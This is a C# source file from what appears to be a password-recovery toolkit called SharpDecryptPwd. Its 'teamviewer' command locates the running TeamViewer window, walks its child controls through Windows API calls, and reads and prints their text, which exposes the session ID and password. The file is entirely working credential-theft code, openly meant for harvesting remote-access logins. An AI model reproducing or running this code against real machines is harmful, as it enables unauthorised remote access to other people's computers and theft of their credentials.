using SharpDecryptPwd.Domain;
using SharpDecryptPwd.Helpers;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace SharpDecryptPwd.Commands
{
    class TeamViewer : ICommand
    {
        public delegate bool EnumChildProc(IntPtr hwnd, IntPtr lParam);
        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", EntryPoint = "EnumChildWindows")]
        public static extern bool EnumChildWindows(IntPtr hwndParent, EnumChildProc EnumFunc, IntPtr lParam);
        [DllImport("user32.dll")]
        private static extern int GetWindowTextW(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)]StringBuilder lpString, int nMaxCount);
        [DllImport("user32.dll")]
        private static extern int GetClassNameW(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)]StringBuilder lpString, int nMaxCount);
        [DllImport("user32.dll", EntryPoint = "SendMessage")]
        private static extern int SendMessage(IntPtr hwnd, int wMsg, int wParam, StringBuilder lParam);

        public static List<WindowInfo> wndList = new List<WindowInfo>();

        public static bool EnumFunc(IntPtr hWnd, IntPtr lParam)
        {
            StringBuilder sb = new StringBuilder(256);
            const int WM_GETTEXT = 0x0D;
            GetClassNameW(hWnd, sb, sb.Capacity);
            if (sb.ToString() == "Edit" || sb.ToString() == "Static")
            {
                WindowInfo wnd = new WindowInfo
                {
                    hWnd = hWnd,
                    szClassName = sb.ToString()
                };
                if (wnd.szClassName == "Edit")
                {
                    StringBuilder stringBuilder = new StringBuilder(256);
                    SendMessage(hWnd, WM_GETTEXT, 256, stringBuilder);
                    wnd.szWindowName = stringBuilder.ToString();
                }
                else
                {
                    GetWindowTextW(hWnd, sb, sb.Capacity);
                    wnd.szWindowName = sb.ToString();
                }
                //Console.WriteLine("Handle=" + wnd.hWnd.ToString().PadRight(20)
                // + " Type=" + wnd.szClassName.PadRight(20)
                // + " Name=" + wnd.szWindowName);

                wndList.Add(wnd);
            }
            return true;
        }

        public static string CommandName => "teamviewer";

        public void DecryptPwd(ArgumentParserContent arguments)
        {
            IntPtr tvIntPtr = FindWindow(null, "TeamViewer");
            if (tvIntPtr == IntPtr.Zero)
            {
                Writer.ErrorLine("Did not find the TeamViewer process or used a modified version");
                return;
            }
            EnumChildProc enumChildProc = new EnumChildProc(EnumFunc);
            EnumChildWindows(tvIntPtr, enumChildProc, IntPtr.Zero);
            foreach (WindowInfo windowInfo in wndList)
            {
                // Because the content is obtained by reading the handle, there is no way to filter the specific content
                if (!string.IsNullOrEmpty(windowInfo.szWindowName))
                    Writer.Line(windowInfo.szWindowName);
            }
        }
    }
    public struct WindowInfo
    {
        public IntPtr hWnd;
        public string szWindowName;
        public string szClassName;
    }
}
